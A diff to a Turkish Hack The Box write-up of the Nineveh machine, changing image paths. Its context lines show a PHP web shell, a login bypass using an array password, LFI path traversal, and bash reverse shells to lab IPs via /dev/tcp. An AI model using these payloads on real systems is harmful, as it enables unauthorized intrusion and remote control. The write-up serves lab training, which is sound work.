@@ -5,7 +5,7 @@
 Nineveh ile ilgili bazı kısımlar, modern bir HTB makinesinde beklediğim şeylerle pek uyuşmuyor – steganografi, parola brute-force ve port knocking gibi. Yine de oldukça ilginç saldırılar vardı. İki farklı şekilde shell elde etmeyi göstereceğim: phpLiteAdmin üzerinden bir web shell yazmak ve PHPinfo'yu kötüye kullanmak. Daha sonra shell erişimimi kullanarak knockd yapılandırmasını okuyacak, port knocking ile SSH’yi açacak ve steganografi ile elde ettiğim anahtar çiftiyle erişim sağlayacağım. Root yetkilerini elde etmek için ise, cron ile çalışan chkrootkit açığını istismar edeceğim.
 
 
-![Pasted image 20250207204320.png](/img/user/Pasted%20image%2020250207204320.png)
+![Pasted image 20250207204320.png](/img/user/resimler/Pasted%20image%2020250207204320.png)
 
 ```
 nmap -p 80,443 -sCV 10.10.10.43      
@@ -43,7 +43,7 @@ Sertifikada geçen **nineveh.htb** domainine ait sub-domainleri kontrol etmek is
 
 Ancak **her iki durumda da herhangi bir sonuç dönmedi**.
 
-![Pasted image 20250207205805.png](/img/user/Pasted%20image%2020250207205805.png)
+![Pasted image 20250207205805.png](/img/user/resimler/Pasted%20image%2020250207205805.png)
 
 
 ### Website - TCP 80
@@ -52,33 +52,33 @@ Ancak **her iki durumda da herhangi bir sonuç dönmedi**.
 
 Site sadece basit bir başarı sayfası gösteriyor ve başka bir bilgi içermiyor.
 
-![Pasted image 20250207205839.png](/img/user/Pasted%20image%2020250207205839.png)
+![Pasted image 20250207205839.png](/img/user/resimler/Pasted%20image%2020250207205839.png)
 
 
 #### Directory Brute Force
 Ayrıca başka hangi pathlerin var olabileceğini görmek için bir forexbuster'ı başlattım. Firefox'ta index.php manuel olarak yüklenmemiş olsa da, Linux olduğu için -x php'yi ekleyeceğim ve bu her zaman tahmin etmeye değer. Bu iki ilginç yol buldu:
 
-![Pasted image 20250207210153.png](/img/user/Pasted%20image%2020250207210153.png)
+![Pasted image 20250207210153.png](/img/user/resimler/Pasted%20image%2020250207210153.png)
 
-![Pasted image 20250207210938.png](/img/user/Pasted%20image%2020250207210938.png)
+![Pasted image 20250207210938.png](/img/user/resimler/Pasted%20image%2020250207210938.png)
 
 
 #### /info.php
 
 Bu sayfa bir PHP Info sayfası sunar:
 
-![Pasted image 20250207210958.png](/img/user/Pasted%20image%2020250207210958.png)
+![Pasted image 20250207210958.png](/img/user/resimler/Pasted%20image%2020250207210958.png)
 
 
 #### /department
 
 Site bir giriş formu sunar:
 
-![Pasted image 20250207211019.png](/img/user/Pasted%20image%2020250207211019.png)
+![Pasted image 20250207211019.png](/img/user/resimler/Pasted%20image%2020250207211019.png)
 
 Bazı temel parola tahminlerini denedim ve hata mesajlarının kullanıcının var olup olmadığını gösterdiğini fark ettim. Örneğin, admin'i denediğimde:
 
-![Pasted image 20250207211035.png](/img/user/Pasted%20image%2020250207211035.png)
+![Pasted image 20250207211035.png](/img/user/resimler/Pasted%20image%2020250207211035.png)
 
 Nineveh'i denediğimde:
 
@@ -88,7 +88,7 @@ Nineveh'i denediğimde:
 
 Bu site sadece bir resim döndürür:
 
-![Pasted image 20250207211057.png](/img/user/Pasted%20image%2020250207211057.png)
+![Pasted image 20250207211057.png](/img/user/resimler/Pasted%20image%2020250207211057.png)
 
 Bu, IP adresi veya nineveh.htb ile aynı ziyarettir.
 
@@ -97,7 +97,7 @@ Bu, IP adresi veya nineveh.htb ile aynı ziyarettir.
 
 Burada forexbuster'ı çalıştırmak da üç yol döndürür:
 
-![Pasted image 20250207212038.png](/img/user/Pasted%20image%2020250207212038.png)
+![Pasted image 20250207212038.png](/img/user/resimler/Pasted%20image%2020250207212038.png)
 
 -k --> sertifika zorunluluklarını atlar . 
 
@@ -107,13 +107,13 @@ Burada forexbuster'ı çalıştırmak da üç yol döndürür:
 
 /db bir phpLiteAdmin örneği için bir oturum açma döndürür:
 
-![Pasted image 20250207212123.png](/img/user/Pasted%20image%2020250207212123.png)
+![Pasted image 20250207212123.png](/img/user/resimler/Pasted%20image%2020250207212123.png)
 
 phpLiteAdmin SQLite veritabanları ile etkileşim için bir PHP arayüzüdür.
 
 Sürüm 1.9, searchsploit bunun için exploitler olduğunu gösteriyor:
 
-![Pasted image 20250207212201.png](/img/user/Pasted%20image%2020250207212201.png)
+![Pasted image 20250207212201.png](/img/user/resimler/Pasted%20image%2020250207212201.png)
 
 Bunları **searchsploit -x [path]** ile incelediğimde:
 
@@ -129,7 +129,7 @@ Ancak, **hepsini kullanabilmek için önce kimlik doğrulaması yapmam gerekiyor
 
 Bu sayfa sadece bir resimdir:
 
-![Pasted image 20250207212325.png](/img/user/Pasted%20image%2020250207212325.png)
+![Pasted image 20250207212325.png](/img/user/resimler/Pasted%20image%2020250207212325.png)
 
 
 ## Shell as www-data (via phpLiteAdmin)
@@ -164,15 +164,15 @@ Hydra'yı şu seçeneklerle çalıştıracağım:
 
 Hydra **hızlı bir şekilde doğru parolayı buluyor**
 
-![Pasted image 20250207213138.png](/img/user/Pasted%20image%2020250207213138.png)
+![Pasted image 20250207213138.png](/img/user/resimler/Pasted%20image%2020250207213138.png)
 
-![Pasted image 20250207213153.png](/img/user/Pasted%20image%2020250207213153.png)
+![Pasted image 20250207213153.png](/img/user/resimler/Pasted%20image%2020250207213153.png)
 
 ### Enumerate phpLiteAdmin
 
 Şifre ile giriş yapabiliyorum:
 
-![Pasted image 20250207213217.png](/img/user/Pasted%20image%2020250207213217.png)
+![Pasted image 20250207213217.png](/img/user/resimler/Pasted%20image%2020250207213217.png)
 
 Yalnızca bir veritabanı vardır, test ve tabloları yoktur.
 
@@ -183,25 +183,25 @@ searchsploit'teki 24044.txt exploit'i, aşağıdaki adımları kullanarak RCE el
 
 1. .php ile biten yeni bir veritabanı oluşturun:
 
-![Pasted image 20250207213329.png](/img/user/Pasted%20image%2020250207213329.png)
+![Pasted image 20250207213329.png](/img/user/resimler/Pasted%20image%2020250207213329.png)
 
 </picture>
 
 Yeni db'ye geçmek için üzerine tıklayacağım ve temel bir PHP webshell'in varsayılan değerine sahip 1 metin alanı içeren bir tablo oluşturacağım:
 
-![Pasted image 20250207213359.png](/img/user/Pasted%20image%2020250207213359.png)
+![Pasted image 20250207213359.png](/img/user/resimler/Pasted%20image%2020250207213359.png)
 
 ```
 <?php system($_REQUEST["cmd"]); ?>
 ```
 
-![Pasted image 20250207214936.png](/img/user/Pasted%20image%2020250207214936.png)
+![Pasted image 20250207214936.png](/img/user/resimler/Pasted%20image%2020250207214936.png)
 
 Sayfayı görüntüleyin.
 
 Ne yazık ki burada takıldım. Yeni .php webshell'in yolunu /var/tmp içinde görebiliyorum:
 
-![Pasted image 20250207215041.png](/img/user/Pasted%20image%2020250207215041.png)
+![Pasted image 20250207215041.png](/img/user/resimler/Pasted%20image%2020250207215041.png)
 
 Ancak bir tarayıcıda bu sayfaya erişmek için gerekli LFI'den yoksundum.
 
@@ -218,7 +218,7 @@ username=admin&password=admin
 
 Eğer bunu şöyle değiştirirsem:
 
-![Pasted image 20250207220143.png](/img/user/Pasted%20image%2020250207220143.png)
+![Pasted image 20250207220143.png](/img/user/resimler/Pasted%20image%2020250207220143.png)
 
 ```
 username=admin&password[]=
@@ -226,7 +226,7 @@ username=admin&password[]=
 
 Beni içeri alıyor:
 
-![Pasted image 20250207220344.png](/img/user/Pasted%20image%2020250207220344.png)
+![Pasted image 20250207220344.png](/img/user/resimler/Pasted%20image%2020250207220344.png)
 
 Bu neden işe yarıyor? PHP farklı veri türlerini karşılaştırma konusunda cömerttir. Dolayısıyla, PHP bir veritabanından alınan (veya burada olduğu gibi sabit kodlanmış) bir parola ile kullanıcı girdisini bir string karşılaştırması yapıyorsa, bu aşağıdaki gibi görünebilir:
 
@@ -347,7 +347,7 @@ Giriş yaptıktan sonra, yukarıda gösterildiği gibi **manage.php** sayfasına
 Ana sayfa düğmesi, yalnızca **"Yapım Aşamasında"** görselini gösteriyor.  
 Buna ek olarak, bir **Notes (Notlar)** düğmesi var ve bu düğme, **?notes=files/ninevehNotes.txt** parametresini aynı PHP sayfasına ekleyerek görselin altına bu metni yerleştiriyor:
 
-![Pasted image 20250207225434.png](/img/user/Pasted%20image%2020250207225434.png)
+![Pasted image 20250207225434.png](/img/user/resimler/Pasted%20image%2020250207225434.png)
 
 "
 Giriş sayfasını düzelttin mi! Sabitlenmiş kullanıcı adı ve şifre gerçekten kötü bir fikir!
@@ -387,7 +387,7 @@ Bir süre fark etmedim ama anlaşılan o ki, parametrede **ninevehNotes** ifades
 
 Şimdi daha önce http://10.10.10.43/department/manage.php?notes=/ninevehNotes/../var/tmp/0xdf.php&cmd=id adresinde bıraktığım webshell'e erişebiliyorum
 
-![Pasted image 20250207230127.png](/img/user/Pasted%20image%2020250207230127.png)
+![Pasted image 20250207230127.png](/img/user/resimler/Pasted%20image%2020250207230127.png)
 
 
 ### Shell
@@ -400,7 +400,7 @@ bash -c 'bash -i >%26 /dev/tcp/10.10.16.9/443 0>%261'
 
 Bir shell almak için, cmd'yi bash -c 'bash -i >%26 /dev/tcp/10.10.14.24/443 0>%261' olarak değiştireceğim (& işaretlerini url olarak kodlamak önemlidir, aksi takdirde yeni bir parametre başlatıyormuş gibi yorumlanırlar). Nc'de bir shell alıyorum:
 
-![Pasted image 20250207230411.png](/img/user/Pasted%20image%2020250207230411.png)
+![Pasted image 20250207230411.png](/img/user/resimler/Pasted%20image%2020250207230411.png)
 
 
 Python2, Nineveh'de yüklü değil, ama Python3 var.
@@ -450,7 +450,7 @@ GET'i POST olarak değiştirdim, Content-Type başlığını ve POST body'yi ekl
 
 Ortaya çıkan sayfa bunu içeriyor:
 
-![Pasted image 20250207231202.png](/img/user/Pasted%20image%2020250207231202.png)
+![Pasted image 20250207231202.png](/img/user/resimler/Pasted%20image%2020250207231202.png)
 
 Bu, dosyanın nerede saklandığının dosya adını içeriyor!
 
@@ -704,9 +704,9 @@ amrois@nineveh:~$
 
 Ayrıca user.txt dosyasını da alabilirim:
 
-![Pasted image 20250208004625.png](/img/user/Pasted%20image%2020250208004625.png)
+![Pasted image 20250208004625.png](/img/user/resimler/Pasted%20image%2020250208004625.png)
 
-![Pasted image 20250208004639.png](/img/user/Pasted%20image%2020250208004639.png)
+![Pasted image 20250208004639.png](/img/user/resimler/Pasted%20image%2020250208004639.png)
 
 ### Shortcut - SSH from localhost
 
@@ -836,8 +836,8 @@ SLAPPER_FILES="${ROOTDIR}tmp/.bugtraq ${ROOTDIR}tmp/.bugtraq.c" SLAPPER_FILES="$
 
 Ben /tmp/update dosyasına basit bir reverse shell yazacağım ve onu çalıştırılabilir yapacağım:
 
-![Pasted image 20250208005335.png](/img/user/Pasted%20image%2020250208005335.png)
+![Pasted image 20250208005335.png](/img/user/resimler/Pasted%20image%2020250208005335.png)
 
 Bir sonraki chkroot çalışmasında bir shell alıyorum:
 
-![Pasted image 20250208005452.png](/img/user/Pasted%20image%2020250208005452.png)
+![Pasted image 20250208005452.png](/img/user/resimler/Pasted%20image%2020250208005452.png)
